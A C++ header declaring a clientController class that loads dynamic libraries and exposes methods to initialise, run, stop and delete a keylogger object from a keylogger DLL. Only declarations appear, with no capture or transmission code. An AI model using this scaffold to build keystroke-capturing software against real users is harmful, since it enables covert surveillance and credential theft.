#ifndef CLIENT_H__
# define CLIENT_H__

# include "DLibrary.h"
# include "keylogger_dll/KeyloggerDLL.h"


class	clientController {

	DLManager	libraries;

	// Dictionaries
	Dictionary	sayHello;
	Dictionary	keylogger_dll;

public:

	clientController(void) throw(DLibraryException);	// Initialise
	~clientController(void);			        // Destroy

	int			mainAction(int, char**);
	void		sayHelloAction(void);
	IKeylogger*	initKeyloggerAction(void);
	bool		runKeyloggerAction(IKeylogger* keylogger);
	bool		stopKeyloggerAction(IKeylogger* keylogger);
	void		deleteKeyloggerAction(IKeylogger* keylogger);
};

#endif /* !CLIENT_H__ */
